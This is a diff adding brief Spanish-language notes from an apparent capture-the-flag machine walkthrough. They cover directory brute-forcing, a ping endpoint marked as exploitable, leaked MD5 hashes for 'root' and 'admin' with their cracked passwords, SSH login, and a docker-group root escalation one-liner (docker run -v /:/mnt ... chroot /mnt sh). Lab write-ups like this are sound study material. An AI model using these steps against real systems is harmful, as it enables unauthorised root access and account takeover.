@@ -1,0 +1,37 @@
+dirb a 8081:
+	/auth
+	/ping
+------------
+dirb a 31331 :
+	/robots.txt
+
+	dissalowed :
+		/partners.html :
+			func = http://${getAPIURL()}/ping?ip=${window.location.hostname}
+			vulnerabilidad de exploi
+
+------------------------------------------------------------------------------------------------------------
+ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not 
+correctly encoded
+
+todo eso seria :
+
+f357a0c52799563c7c7b76c1e7543a32 : n100906
+
+0d0ea5111e3c1def594c1684e3b9be84 : mrsheafy
+-----------------------------------------------------------------------------------------------------------
+Probamos en el servidor osea en /partners y nos dice que el interno ha hecho todo mal y ya que ya probamos un
+user y password ahora solo falta las otras credenciales.
+
+
+Entramos a ssh con las credenciales que nos quedan.
+-------------------------------------------------------------------------	
+Analizamos con LinEnum.sh
+
+vemos que somos del grupo que puede ejecutar doker y encuentro una manera de escalar en esta pagina :
+
+
+https://gtfobins.github.io/gtfobins/docker/#shell
+
+docker run -v /:/mnt --rm -it bash chroot /mnt sh
+---------------------------------------------------
